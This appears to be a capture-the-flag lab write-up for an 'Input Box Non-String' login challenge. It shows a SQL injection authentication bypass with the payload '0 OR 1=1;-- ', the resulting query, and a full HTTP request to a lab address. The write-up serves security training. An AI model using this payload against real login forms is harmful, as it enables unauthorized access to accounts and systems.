# Challenge 1: Input Box Non-String

![Pasted image 20210803154811](Pasted%20image%2020210803154811.png)

This challenge is comprised of a login form asking for a user ID and a password. Since the title of the challenge is "Input Box Non-String," it appears the user ID parameter is the target parameter and that it probably is an integer on the backend.

Looking further at the HTMl source of the form, it appears that it sends a GET request to the URI `/sesqli1/login` with the query parameters `profileID` and `password`. The user ID is of type text, although on the backend it is treated like an integer.

The backend SQL query probably looks something like this:

```sql
SELECT profileID FROM profiles WHERE profileID = $profileID AND password = '$PASSWORD';
```

and the return of one column results in the application authenticating the user.

The injection for ProfileID looks like this:

```txt
0 OR 1=1;-- 
```

resulting in the query:

```sql
SELECT profileID FROM profiles WHERE profileID = 0 OR 1=1;--  AND password = '$PASSWORD';
```

HTTP request:

```http
GET /sesqli1/login?profileID=0+OR+1=1--%20&password=pass HTTP/1.1
Host: 10.10.240.237:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: http://10.10.240.237:5000/sesqli1/login?next=http%3A%2F%2F10.10.240.237%3A5000%2Fsesqli1%2Fhome
Cookie: session=eyJtYWluYXBwX3F1ZXJ5Ijp0cnVlfQ.YQmdGw.Jql5u251EzgC1eOfYh1kZWd882c
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
```

![Pasted image 20210803160414](Pasted%20image%2020210803160414.png)
